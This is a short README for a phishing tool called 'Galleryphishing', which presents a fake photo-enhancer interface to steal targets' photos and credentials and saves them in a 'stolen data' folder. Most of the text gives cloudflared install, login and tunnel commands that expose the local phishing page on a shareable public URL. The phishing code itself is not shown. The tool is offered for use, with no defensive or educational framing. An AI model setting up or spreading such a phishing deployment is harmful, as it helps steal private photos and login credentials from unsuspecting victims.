# Galleryphishing


A photo enhancer interface to steal photos of targets , credentials will provided in folder name stolen data 

# Host with cloudflair to get sharable link


```bash
# Ubuntu/Debian
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# OR Mac
brew install cloudflared

# OR Windows (PowerShell)
winget install Cloudflare.cloudflared
```
## Login on clodflare 

```bash

#login here
cloudflared tunnel login
```

## host 

```bash
# Terminal 2 - Create tunnel
cloudflared tunnel create photo-phish 

# Run tunnel (copies public URL automatically!)
cloudflared tunnel --url http://localhost:8080
```
